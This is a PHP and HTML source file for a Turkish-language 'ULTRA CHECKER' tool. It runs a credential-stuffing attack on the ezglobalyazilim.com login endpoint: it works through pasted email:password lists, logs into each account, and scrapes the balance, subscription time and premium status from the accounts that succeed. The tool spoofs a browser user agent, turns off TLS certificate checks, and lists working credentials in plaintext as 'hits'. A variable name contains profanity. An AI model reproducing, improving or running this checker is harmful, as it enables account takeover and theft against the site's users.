<?php
session_start();
// Güvenlik: Oturum kontrolü
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

if (isset($_GET['action']) && $_GET['action'] == 'check') {
    header('Content-Type: application/json');
    error_reporting(0);

    $user = trim($_POST['user'] ?? '');
    $pass = trim($_POST['pass'] ?? '');
    
    $cookie = dirname(__FILE__) . "/ez_cookie_" . md5($user . time()) . ".txt";

    function ez_curl($url, $post = null, $customHeaders = [], $ck) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $ck);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $ck);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        
        $headers = array_merge([
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept: */*"
        ], $customHeaders);

        if ($post !== null) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $res = curl_exec($ch);
        curl_close($ch);
        return $res;
    }

    ez_curl("https://www.ezglobalyazilim.com/uyelik.html", null, [], $cookie);

    $postData = "s1=uyelik&s2=islem&islem=gir&refuser=0&eposta=".urlencode($user)."&sifre=".urlencode($pass)."&ajtip=eva";
    $loginRes = ez_curl(
        "https://www.ezglobalyazilim.com/ajax.php",
        $postData,
        [
            "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With: XMLHttpRequest",
            "Origin: https://www.ezglobalyazilim.com",
            "Referer: https://www.ezglobalyazilim.com/uyelik.html"
        ],
        $cookie
    );

    if (strpos($loginRes, 'Üye girişi başarılı') !== false) {
        
        $yaolmsikerimsenidiyorumannnalllaaa = ez_curl("https://www.ezglobalyazilim.com/hesabim/profil.html", null, [], $cookie);
        preg_match('/<li class=\"bakiye\">(.*?)<\/li>/', $yaolmsikerimsenidiyorumannnalllaaa, $bak);
        $bakiye = isset($bak[1]) ? trim(strip_tags($bak[1])) : "0 TL";

        $program = ez_curl("https://www.ezglobalyazilim.com/hesabim/program.html", null, [], $cookie);
        preg_match('/<div class=\"fsize-18\" style=\"margin-top: 20px;\">(.*?)<br><br>/s', $program, $prog);
        $sure = isset($prog[1]) ? trim(strip_tags($prog[1])) : "Süre Yok";

        $premium = ez_curl("https://www.ezglobalyazilim.com/hesabim/premium.html", null, [], $cookie);
        preg_match('/<div class=\"fsize-24 fweight-700 font-agency color-white uppercase\">(.*?)<\/div>/', $premium, $pre);
        $isPremium = isset($pre[1]) ? trim(strip_tags($pre[1])) : "STANDART";

        echo json_encode([
            'status' => 'success',
            'user' => $user, 'pass' => $pass,
            'bakiye' => $bakiye,
            'sure' => $sure,
            'premium' => $isPremium
        ]);
    } else {
        echo json_encode(['status' => 'fail', 'user' => $user]);
    }

    if(file_exists($cookie)) @unlink($cookie);
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>EZGLOBAL ULTRA CHECKER v2.6</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { 
            --bg: #0b0e14; 
            --card: #151921; 
            --primary: #10b981; 
            --accent: #3b82f6;  
            --success: #059669; 
            --danger: #ef4444; 
            --border: #262c36; 
            --text: #e2e8f0; 
        }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); padding: 20px; margin: 0; }
        .container { max-width: 1400px; margin: 0 auto; }
        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 15px 0; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
        .header-stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px; }
        .stat-card { background: var(--card); border: 1px solid var(--border); padding: 15px; border-radius: 12px; text-align: center; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); }
        .stat-card b { display: block; font-size: 24px; margin-top: 5px; color: #fff; }
        .main-grid { display: grid; grid-template-columns: 1fr 2.5fr; gap: 20px; }
        textarea { width: 100%; height: 250px; background: #0f172a; border: 1px solid var(--border); border-radius: 10px; color: var(--primary); padding: 10px; font-family: monospace; outline: none; margin-bottom: 10px; resize: none; }
        .scroll-box { height: 600px; overflow-y: auto; background: rgba(0,0,0,0.2); border: 1px solid var(--border); border-radius: 15px; padding: 15px; }
        .hit-item { background: var(--card); border: 1px solid var(--border); border-left: 4px solid var(--primary); border-radius: 10px; padding: 15px; margin-bottom: 15px; animation: slideIn 0.3s ease; }
        .btn { width: 100%; padding: 15px; background: var(--primary); color: #fff; border: none; border-radius: 12px; font-weight: 800; cursor: pointer; transition: 0.3s; text-decoration: none; display: inline-block; text-align: center; }
        .btn:hover { filter: brightness(1.1); }
        .btn-danger { background: var(--danger); }
        .btn-exit { background: transparent; color: var(--text); padding: 8px 16px; border-radius: 8px; font-size: 13px; margin-left: 15px; border: 1px solid var(--border); text-decoration: none; transition: 0.2s; }
        .btn-exit:hover { background: var(--danger); border-color: var(--danger); color: white; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="container">
    <nav class="navbar">
        <div class="logo">
            <i class="fas fa-crosshairs" style="color:var(--primary)"></i>
            <span style="font-weight:900; margin-left: 8px; letter-spacing: 1px;">EZGLOBAL <span style="color:var(--primary)">ULTRA</span> CHECKER</span>
        </div>
        <div style="display: flex; align-items: center;">
            <div style="font-size: 12px; color: #64748b; font-weight: 500;">EzGlobal Software API</div>
            <a href="index.php" class="btn-exit"><i class="fas fa-power-off"></i> ÇIKIŞ YAP</a>
        </div>
    </nav>

    <div class="header-stats">
        <div class="stat-card" style="border-bottom: 3px solid var(--accent);">KALAN <b id="s_total">0</b></div>
        <div class="stat-card" style="border-bottom: 3px solid var(--success);">BAŞARILI <b id="s_hit">0</b></div>
        <div class="stat-card" style="border-bottom: 3px solid var(--danger);">HATALI <b id="s_fail">0</b></div>
    </div>

    <div class="main-grid">
        <div class="side-panel">
            <textarea id="accs" placeholder="eposta:sifre"></textarea>
            <button id="actionBtn" onclick="toggleProcess()" class="btn">TARAMAYI BAŞLAT</button>
            <div class="scroll-box" id="fullLog" style="height: 315px; margin-top:15px; font-size:11px; color:#64748b;"></div>
        </div>
        <div class="hit-panel">
            <div class="scroll-box" id="hitLog"></div>
        </div>
    </div>
</div>

<script>
let isRunning = false;
let hits = 0, fails = 0;

function appendHit(res) {
    const hitsBox = document.getElementById('hitLog');
    const badgeColor = (res.premium !== "STANDART") ? "var(--primary)" : "#475569";
    const item = `
    <div class="hit-item" style="border-left-color:${badgeColor}">
        <div style="padding:5px 10px 10px 10px; border-bottom:1px solid var(--border); display:flex; justify-content:space-between; align-items:center;">
            <b style="color:#fff; font-size:15px; font-family:monospace;">${res.user}:${res.pass}</b>
            <span style="background:${badgeColor}; color:white; padding:4px 12px; border-radius:20px; font-size:11px; font-weight:800; letter-spacing:0.5px;">${res.premium}</span>
        </div>
        <div style="padding:12px 10px 5px 10px; display:grid; grid-template-columns: repeat(2, 1fr); gap:15px; font-size:11px;">
            <div><small style="color:#64748b; display:block; margin-bottom:3px;">BAKİYE</small><b style="color:var(--primary)">${res.bakiye}</b></div>
            <div><small style="color:#64748b; display:block; margin-bottom:3px;">PROGRAM SÜRESİ</small><b>${res.sure}</b></div>
        </div>
    </div>`;
    hitsBox.innerHTML = item + hitsBox.innerHTML;
}

async function process() {
    const accs = document.getElementById('accs').value.split('\n').filter(l => l.includes(':'));
    if(!accs.length) return alert("Liste boş!");

    isRunning = true;
    const btn = document.getElementById('actionBtn');
    btn.innerText = "DURDUR"; btn.classList.add('btn-danger');

    for (let i = 0; i < accs.length; i++) {
        if (!isRunning) break;
        
        document.getElementById('s_total').innerText = accs.length - i;
        const [u, p] = accs[i].trim().split(':');
        const fd = new FormData();
        fd.append('user', u); fd.append('pass', p);

        try {
            const response = await fetch('?action=check', { method: 'POST', body: fd });
            const res = await response.json();
            const log = document.getElementById('fullLog');

            if(res.status === 'success') {
                hits++;
                document.getElementById('s_hit').innerText = hits;
                log.innerHTML = `<div>[${new Date().toLocaleTimeString()}] <span style="color:var(--success)">HIT</span> -> ${u}</div>` + log.innerHTML;
                appendHit(res);
            } else {
                fails++;
                document.getElementById('s_fail').innerText = fails;
                log.innerHTML = `<div>[${new Date().toLocaleTimeString()}] <span style="color:var(--danger)">FAIL</span> -> ${u}</div>` + log.innerHTML;
            }
        } catch (e) { console.error(e); }
    }
    isRunning = false;
    btn.innerText = "TARAMAYI BAŞLAT"; btn.classList.remove('btn-danger');
}

function toggleProcess() { isRunning ? (isRunning = false) : process(); }
</script>
</body>
</html>